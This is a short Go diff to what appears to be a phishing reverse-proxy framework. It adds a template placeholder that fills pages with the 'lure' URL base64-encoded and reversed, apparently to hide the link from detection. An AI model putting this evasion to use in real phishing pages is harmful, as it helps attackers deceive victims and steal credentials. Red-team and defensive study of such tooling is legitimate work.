@@ -1476,8 +1476,15 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 		n += rn
 	}
 
+	var lure_b64 = base64.StdEncoding.EncodeToString([]byte(lure_url))
+	var lure_enc string
+	for _,v := range lure_b64 {
+		lure_enc = string(v) + lure_enc
+	}
+
 	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
 	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
+	body = strings.Replace(body, "{lure_url_enc}", lure_enc, -1)
 
 	return body
 }
